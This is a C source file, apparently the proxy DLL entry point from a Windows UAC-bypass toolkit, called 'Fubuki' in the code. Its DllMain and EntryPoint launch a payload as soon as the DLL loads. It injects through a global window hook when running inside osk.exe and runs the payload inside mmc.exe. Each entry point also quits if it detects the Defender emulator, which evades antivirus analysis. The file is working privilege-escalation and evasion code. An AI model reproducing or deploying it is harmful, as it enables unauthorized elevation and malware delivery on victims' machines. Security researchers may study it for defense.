/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2018
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"

DWORD g_AkagiFlag;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bIsLocalSystem = FALSE, bReadSuccess;
    PWSTR lpParameter = NULL;
    ULONG cbParameter = 0L;

    OutputDebugString(LoadedMsg);

    ucmIsLocalSystem(&bIsLocalSystem);
    g_AkagiFlag = AKAGI_FLAG_KILO;     

    bReadSuccess = ucmReadParameters(
        &lpParameter,
        &cbParameter,
        &g_AkagiFlag,
        NULL,
        bIsLocalSystem);

    ucmLaunchPayload(
        lpParameter,
        cbParameter);

    if ((lpParameter == NULL) && (cbParameter == 0)) {
        if (g_AkagiFlag == AKAGI_FLAG_KILO) {
            ucmQueryRuntimeInfo(FALSE);
        }
    }
    else {
        if (bReadSuccess) {
            RtlFreeHeap(
                NtCurrentPeb()->ProcessHeap,
                0,
                lpParameter);
        }
    }

    ExitProcess(0);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    WCHAR szModuleName[MAX_PATH + 1];

    OutputDebugString(LoadedMsg);

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;

    //
    // Check if we are in the required application context
    // Are we inside osk.exe?
    //
    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
        if (HookProcedure) {
            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
            if (hHook) {
                //
                // Timeout to be enough to spawn target app.
                //
                Sleep(15000);
                UnhookWindowsHookEx(hHook);
            }
        }
        ExitProcess(0);
    }

    //
    // Are we inside target app?
    //
    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
        DefaultPayload();
    }
}

/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        UiAccessMethodPayload(hinstDLL);
    }

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

/*
* EntryPoint
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPoint(
    VOID)
{
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        ExitProcess('foff');
    }
    DefaultPayload();
}
